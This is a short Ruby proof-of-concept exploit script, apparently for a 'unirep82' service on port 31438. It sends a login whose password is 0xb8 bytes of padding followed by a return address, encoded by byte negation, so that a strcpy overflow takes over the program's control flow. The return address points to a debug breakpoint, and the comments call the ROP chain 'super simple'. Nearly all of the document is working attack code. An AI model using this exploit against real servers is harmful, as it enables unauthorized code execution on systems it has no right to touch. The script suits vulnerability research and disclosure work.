# Encoding: ASCII-8BIT

require 'base64'
require 'pp'

require_relative './libneptune'

def usage
  puts "Usage: #{ $0 } <host> [port]"
  puts
  puts "Eg:"
  puts
  puts "ruby #{ $0 } 10.0.0.198 31438"
  exit
end

HOST = ARGV[0] || usage()
PORT = ARGV[1] || "31438"

# Connect to the target
connection = LibNeptune::new(HOST, PORT)

# Connect to the udadmin service
puts "Connecting to 'udsub (unirep82)' service:"
pp connection.send_recv(
  args: [
    # Service name
    { type: :string, value: 'unirep82' },

    # "SSL Flag" - must be non-zero if the service is started in "secure-only" mode (-s)
    # (doesn't affect this exploit)
    { type: :integer, value: 1337 },
  ],
)

# The overflow amount
RETURN_ADDRESS_OFFSET = 0xb8

# This just crashes
#RETURN_ADDRESS = 0x0c0ffee00c0ffee0
RETURN_ADDRESS = 0x402b4b # This is just a debug breakpoint

# Build the ROP chain - super simple!
PAYLOAD = [ RETURN_ADDRESS ].pack('Q*')

# Make sure we aren't using a banned character - 0xFF encodes to a NUL byte,
# which breaks the strcpy()
if PAYLOAD.include?("\xff")
  $stderr.puts("ROP string includes a 0xFF, which can't happen!")
  exit 1
end

OVERFLOW_PADDING = "A" * RETURN_ADDRESS_OFFSET

USERNAME = "test"
PASSWORD = OVERFLOW_PADDING + PAYLOAD

connection.send_recv(
  args: [
    # Username
    { type: :string, value: USERNAME },

    # Password (encoded by making each byte negative)
    { type: :string, value: PASSWORD.bytes.map { |b| (0x0FF & (~b)).chr }.join },
  ],
)

puts "Payload sent"
